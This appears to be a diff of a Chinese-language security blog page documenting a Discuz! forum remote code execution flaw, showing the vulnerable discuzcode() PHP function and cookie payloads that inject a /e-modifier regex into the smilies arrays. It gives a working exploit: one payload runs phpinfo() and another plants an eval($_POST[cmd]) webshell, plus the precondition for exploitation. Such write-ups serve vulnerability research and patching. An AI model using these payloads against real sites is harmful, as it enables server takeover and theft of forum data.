@@ -238,7 +238,7 @@
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">在include/discuzcode.func.php中</span><br><span class="line"></span><br><span class="line">function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode =1, $allowhtml = 0, $jammer = 0, $parsetype = &apos;0&apos;, $authorid = &apos;0&apos;, $allowmediacode = &apos;0&apos;, $pid = 0) &#123;</span><br><span class="line">global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowattachurl;</span><br><span class="line">if($parsetype != 1 &amp;&amp; !$bbcodeoff &amp;&amp; $allowbbcode &amp;&amp; (strpos($message, &apos;[/code]&apos;) || strpos($message, &apos;[/CODE]&apos;)) !== FALSE) &#123;</span><br><span class="line">    $message = preg_replace(&quot;/s?[code](.+?)[/code]s?/ies&quot;, &quot;codedisp(&apos;\1&apos;)&quot;, $message);</span><br><span class="line">&#125;</span><br><span class="line">    $msglower = strtolower($message);</span><br><span class="line">//$htmlon = $htmlon &amp;&amp; $allowhtml ? 1 : 0;</span><br><span class="line">if(!$htmlon) &#123;</span><br><span class="line">    $message = $jammer ? preg_replace(&quot;/rn|n|r/e&quot;, &quot;jammer()&quot;, dhtmlspecialchars($message)) : dhtmlspecialchars($message);</span><br><span class="line">&#125;</span><br><span class="line">if(!$smileyoff &amp;&amp; $allowsmilies &amp;&amp; !empty($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;]) &amp;&amp; is_array($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;])) &#123;</span><br><span class="line">    if(!$discuzcodes[&apos;smiliesreplaced&apos;]) &#123;</span><br><span class="line">        foreach($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;] AS $key =&gt; $smiley) &#123;</span><br><span class="line">            $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;][$key] = &apos;&lt;img src=&quot;images/smilies/&apos;.$GLOBALS[&apos;_DCACHE&apos;][&apos;smileytypes&apos;][$GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;typearray&apos;][$key]][&apos;directory&apos;].&apos;/&apos;.$smiley.&apos;&quot; smilieid=&quot;&apos;.$key.&apos;&quot; border=&quot;0&quot; alt=&quot;&quot; /&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        $discuzcodes[&apos;smiliesreplaced&apos;] = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    $message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>其中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);</span><br></pre></td></tr></table></figure></p>
 <p>的preg_replace可以执行命令</p>
-<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>随便打开一篇管理员发布的帖子(试了试自己发的帖子貌似不行)，然后抓包将:</p>
+<p>随便打开一篇管理员发布的帖子(试了试自己发的帖子貌似不行)，然后抓包将:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PBb_fid2=1539768491;GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</span><br></pre></td></tr></table></figure>
 <p>添加进cookie：</p>
 <figure class="image-box">
@@ -248,6 +248,9 @@
 <p>可以看到已经成功的执行了phpinfo，一句话的话换成:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval($_POST[cmd])%3B</span><br></pre></td></tr></table></figure>
 <p>即可拿到shell</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
+<li>当然是request_order值为GP啦~</li>
+</ul>
 
         </div>
         
@@ -255,7 +258,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2018-10-18T08:35:31.806Z" itemprop="dateUpdated">2018-10-18 16:35:31</time>
+    Last updated: <time datetime="2018-10-18T08:39:28.041Z" itemprop="dateUpdated">2018-10-18 16:39:28</time>
 </span><br>
 
 
@@ -357,7 +360,7 @@
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞复现"><span class="post-toc-number">1.</span> <span class="post-toc-text">漏洞复现</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">3.</span> <span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞复现-1"><span class="post-toc-number">4.</span> <span class="post-toc-text">漏洞复现</span></a></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞复现"><span class="post-toc-number">1.</span> <span class="post-toc-text">漏洞复现</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">3.</span> <span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#利用条件"><span class="post-toc-number">4.</span> <span class="post-toc-text">利用条件</span></a></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </aside>
